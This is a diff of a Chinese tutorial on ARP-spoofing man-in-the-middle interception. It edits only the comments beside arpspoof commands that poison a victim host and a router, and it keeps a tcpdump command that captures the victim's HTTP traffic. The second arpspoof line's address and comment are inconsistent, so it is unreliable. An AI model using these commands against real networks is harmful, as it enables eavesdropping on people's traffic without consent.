@@ -62,10 +62,10 @@ Nmap done: 256 IP addresses (8 hosts up) scanned in 102.69 seconds
 
 打开一个控制台
 > apt-get install dsniff
-> arpspoof -i eth0 -t 192.168.0.103(受害者ip) 192.168.0.1(路由器ip)     告诉192.168.0.103它，我是路由器
+> arpspoof -i eth0 -t 192.168.0.103(受害者ip) 192.168.0.1(路由器ip)     告诉192.168.0.103(受害者ip)，我是路由器
 
 我们再打开一个控制台：
-> arpspoof -i eth0 -t 192.168.0.1(路由器ip) 192.168.1.101(我的ip)      告诉路由器，我是小米手机
+> arpspoof -i eth0 -t 192.168.0.1(路由器ip) 192.168.1.101(我的ip)      告诉路由器，我的ip是(受害者)
 
 我们再打开一个控制台：
 > tcpdump tcp -nnAi eth0 port 80 and host 192.168.0.103(受害者ip)
